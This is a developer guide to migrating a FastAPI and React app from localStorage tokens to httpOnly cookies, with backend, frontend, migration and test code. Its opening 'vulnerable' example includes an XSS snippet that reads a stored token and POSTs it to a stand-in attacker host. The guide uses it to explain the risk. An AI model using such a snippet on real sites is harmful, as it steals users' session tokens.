# httpOnly Cookie Authentication Migration

## 🎯 Purpose

Migrate from localStorage token storage to secure httpOnly cookies, eliminating XSS token theft vulnerability.

**DOUTRINA VÉRTICE - GAP #12 (P2)**
**Following Boris Cherny: "Security should be layered"**

## ❌ Current Problem: localStorage

```javascript
// ❌ VULNERABLE - Tokens in localStorage
localStorage.setItem('access_token', token);

// Any XSS attack can steal the token:
const stolenToken = localStorage.getItem('access_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: stolenToken
});
```

**Vulnerabilities:**
1. **XSS Attack**: Malicious JavaScript can read localStorage
2. **Browser Extensions**: Any extension can access localStorage
3. **No Expiration**: Tokens persist even after browser close (if not cleared)
4. **CSRF**: Must manually add token to requests

## ✅ Solution: httpOnly Cookies

```python
# ✅ SECURE - Tokens in httpOnly cookies
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,      # ✅ JavaScript can't access
    secure=True,        # ✅ HTTPS only
    samesite="lax",     # ✅ CSRF protection
    max_age=1800,       # ✅ Auto-expires in 30 min
)
```

**Security Benefits:**
1. **XSS Protection**: JavaScript cannot access httpOnly cookies
2. **Auto-Sent**: Browser automatically includes cookie in requests
3. **Auto-Expires**: Cookie expires after max_age
4. **CSRF Protection**: SameSite attribute prevents CSRF

## 📦 Implementation

### Backend (FastAPI)

#### 1. Login Endpoint - Set Cookies

```python
from fastapi import FastAPI, Response, HTTPException
from fastapi.responses import JSONResponse
from datetime import timedelta
from pydantic import BaseModel

app = FastAPI()

class LoginRequest(BaseModel):
    email: str
    password: str

@app.post("/api/v1/auth/login")
async def login(credentials: LoginRequest, response: Response):
    """
    Login and set httpOnly cookies for access and refresh tokens.

    Sets two cookies:
    - access_token: Short-lived (30 min)
    - refresh_token: Long-lived (7 days)
    """
    # Validate credentials (your logic here)
    user = authenticate_user(credentials.email, credentials.password)
    if not user:
        raise HTTPException(401, "Invalid credentials")

    # Generate tokens
    access_token = create_access_token(user.id)
    refresh_token = create_refresh_token(user.id)

    # Set access token cookie (short-lived)
    response.set_cookie(
        key="access_token",
        value=access_token,
        httponly=True,        # XSS protection
        secure=True,          # HTTPS only
        samesite="lax",       # CSRF protection
        max_age=1800,         # 30 minutes
        path="/",             # Available on all paths
    )

    # Set refresh token cookie (long-lived)
    response.set_cookie(
        key="refresh_token",
        value=refresh_token,
        httponly=True,
        secure=True,
        samesite="lax",
        max_age=604800,       # 7 days
        path="/api/v1/auth/refresh",  # Only for refresh endpoint
    )

    # Return user info (NOT the tokens!)
    return {
        "status": "authenticated",
        "user": {
            "id": user.id,
            "email": user.email,
            "name": user.name,
        }
    }
```

#### 2. Protected Endpoints - Read Cookie

```python
from fastapi import Request, Depends, HTTPException
import jwt

async def get_current_user(request: Request):
    """
    Extract user from access_token cookie.

    Replaces: token = request.headers.get("Authorization")
    """
    # Get token from cookie (not Authorization header!)
    access_token = request.cookies.get("access_token")

    if not access_token:
        raise HTTPException(401, "Not authenticated")

    try:
        # Decode JWT
        payload = jwt.decode(
            access_token,
            SECRET_KEY,
            algorithms=["HS256"]
        )

        user_id = payload.get("sub")
        if not user_id:
            raise HTTPException(401, "Invalid token")

        # Fetch user from DB
        user = db.get_user(user_id)
        if not user:
            raise HTTPException(401, "User not found")

        return user

    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(401, "Invalid token")

@app.get("/api/v1/scans")
async def list_scans(current_user = Depends(get_current_user)):
    """Protected endpoint - requires authentication."""
    scans = db.get_scans(current_user.id)
    return scans
```

#### 3. Refresh Endpoint - Rotate Tokens

```python
@app.post("/api/v1/auth/refresh")
async def refresh_token(request: Request, response: Response):
    """
    Refresh access token using refresh token cookie.

    Returns new access token + refreshes refresh token (rotation).
    """
    # Get refresh token from cookie
    refresh_token = request.cookies.get("refresh_token")

    if not refresh_token:
        raise HTTPException(401, "No refresh token")

    try:
        # Validate refresh token
        payload = jwt.decode(
            refresh_token,
            SECRET_KEY,
            algorithms=["HS256"]
        )

        user_id = payload.get("sub")

        # Generate new tokens
        new_access_token = create_access_token(user_id)
        new_refresh_token = create_refresh_token(user_id)  # Rotate!

        # Set new cookies
        response.set_cookie(
            key="access_token",
            value=new_access_token,
            httponly=True,
            secure=True,
            samesite="lax",
            max_age=1800,
        )

        response.set_cookie(
            key="refresh_token",
            value=new_refresh_token,
            httponly=True,
            secure=True,
            samesite="lax",
            max_age=604800,
        )

        return {"status": "refreshed"}

    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "Refresh token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(401, "Invalid refresh token")
```

#### 4. Logout Endpoint - Clear Cookies

```python
@app.post("/api/v1/auth/logout")
async def logout(response: Response):
    """
    Logout by clearing cookies.
    """
    # Clear access token
    response.delete_cookie(
        key="access_token",
        path="/",
    )

    # Clear refresh token
    response.delete_cookie(
        key="refresh_token",
        path="/api/v1/auth/refresh",
    )

    return {"status": "logged_out"}
```

### Frontend (React/TypeScript)

#### 1. Login - No Manual Token Storage

```typescript
// ❌ OLD - Manual localStorage storage
async function login(email: string, password: string) {
  const response = await fetch('/api/v1/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  });

  const data = await response.json();
  localStorage.setItem('access_token', data.access_token);  // ❌ Vulnerable!
}

// ✅ NEW - Cookies set automatically by server
async function login(email: string, password: string) {
  const response = await fetch('/api/v1/auth/login', {
    method: 'POST',
    credentials: 'include',  // ✅ Include cookies in request/response
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });

  const data = await response.json();

  // No manual token storage!
  // Cookie is automatically set by browser

  return data.user;
}
```

#### 2. API Requests - Include Credentials

```typescript
// ❌ OLD - Manual Authorization header
const token = localStorage.getItem('access_token');
fetch('/api/v1/scans', {
  headers: {
    'Authorization': `Bearer ${token}`,  // ❌ Manual token management
  },
});

// ✅ NEW - Automatic cookie inclusion
fetch('/api/v1/scans', {
  credentials: 'include',  // ✅ Browser automatically sends cookies
});
```

#### 3. Axios Configuration

```typescript
import axios from 'axios';

// Configure axios to always include credentials
const apiClient = axios.create({
  baseURL: 'http://localhost:8000',
  withCredentials: true,  // ✅ Always include cookies
});

// Use as normal (cookies sent automatically)
const scans = await apiClient.get('/api/v1/scans');
```

#### 4. Auto-Refresh Token

```typescript
import { useEffect } from 'react';

function useTokenRefresh() {
  useEffect(() => {
    // Refresh token every 25 minutes (before 30min expiry)
    const interval = setInterval(async () => {
      try {
        await fetch('/api/v1/auth/refresh', {
          method: 'POST',
          credentials: 'include',  // Send refresh_token cookie
        });

        console.log('Token refreshed');
      } catch (error) {
        console.error('Failed to refresh token', error);
        // Redirect to login
        window.location.href = '/login';
      }
    }, 25 * 60 * 1000);  // 25 minutes

    return () => clearInterval(interval);
  }, []);
}
```

#### 5. Logout - Call Endpoint

```typescript
async function logout() {
  await fetch('/api/v1/auth/logout', {
    method: 'POST',
    credentials: 'include',  // Send cookies to be cleared
  });

  // Redirect to login
  window.location.href = '/login';
}
```

## 🔄 Migration Guide

### Phase 1: Backend Changes (Week 1)

1. **Add cookie-based endpoints** (keep old endpoints for compatibility)
   ```python
   @app.post("/api/v2/auth/login")  # New cookie-based
   @app.post("/api/v1/auth/login")  # Old token-based (deprecated)
   ```

2. **Update authentication middleware** to check both:
   ```python
   # Check cookie first, fallback to Authorization header
   token = request.cookies.get("access_token") or \
           request.headers.get("Authorization", "").replace("Bearer ", "")
   ```

3. **Deploy backend** with dual support

### Phase 2: Frontend Changes (Week 2)

1. **Update API client configuration**
   ```typescript
   axios.defaults.withCredentials = true;
   ```

2. **Remove localStorage token management**
   ```typescript
   // DELETE these lines:
   localStorage.setItem('access_token', token);
   localStorage.getItem('access_token');
   localStorage.removeItem('access_token');
   ```

3. **Update login/logout flows**

4. **Add auto-refresh logic**

5. **Deploy frontend**

### Phase 3: Cleanup (Week 3)

1. **Monitor usage** of old v1 endpoints

2. **Deprecate v1 endpoints** (return deprecation warning)

3. **Remove v1 endpoints** after migration period

4. **Remove Authorization header fallback**

## ⚠️ Important Considerations

### 1. CORS Configuration

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://your-frontend.com"],  # Specific origin!
    allow_credentials=True,  # ✅ Required for cookies
    allow_methods=["*"],
    allow_headers=["*"],
)
```

### 2. Domain Configuration

```python
# ❌ Won't work across subdomains
response.set_cookie(key="token", domain="app.example.com")

# ✅ Works for all subdomains
response.set_cookie(key="token", domain=".example.com")  # Note the leading dot
```

### 3. Development vs Production

```python
import os

SECURE_COOKIE = os.getenv("ENVIRONMENT") == "production"

response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,
    secure=SECURE_COOKIE,  # False in dev (HTTP), True in prod (HTTPS)
    samesite="lax",
)
```

### 4. Cookie Size Limits

```
Max cookie size: 4096 bytes
```

If JWT is too large:
- Use session IDs instead of JWTs in cookies
- Store session data in Redis/database
- Reference session by ID in cookie

## 🔒 Security Checklist

- [ ] `httponly=True` (prevents JavaScript access)
- [ ] `secure=True` (HTTPS only in production)
- [ ] `samesite="lax"` or `"strict"` (CSRF protection)
- [ ] Short `max_age` for access token (15-30 min)
- [ ] Longer `max_age` for refresh token (7 days max)
- [ ] Different `path` for refresh endpoint
- [ ] Token rotation on refresh
- [ ] Proper CORS configuration (`allow_credentials=True`)
- [ ] Specific `allow_origins` (not `*`)

## 🧪 Testing

### Test Cookie Setting

```python
def test_login_sets_cookies(client):
    """Login should set httpOnly cookies."""
    response = client.post("/api/v1/auth/login", json={
        "email": "test@example.com",
        "password": "password123"
    })

    assert response.status_code == 200

    # Check cookies
    cookies = response.cookies
    assert "access_token" in cookies
    assert "refresh_token" in cookies

    # Check httpOnly flag
    access_cookie = cookies["access_token"]
    assert access_cookie["httponly"] is True
    assert access_cookie["secure"] is True
    assert access_cookie["samesite"] == "lax"
```

### Test Protected Endpoint

```python
def test_protected_endpoint_with_cookie(client):
    """Protected endpoint should work with cookie."""
    # Login to get cookie
    login_response = client.post("/api/v1/auth/login", json={
        "email": "test@example.com",
        "password": "password123"
    })

    # Access protected endpoint (cookie sent automatically)
    response = client.get("/api/v1/scans")

    assert response.status_code == 200
```

## 📖 References

- [OWASP: HttpOnly Cookie](https://owasp.org/www-community/HttpOnly)
- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)

---

**DOUTRINA VÉRTICE - GAP #12 (P2)**
**Following Boris Cherny: "Security should be layered"**
**Soli Deo Gloria** 🙏
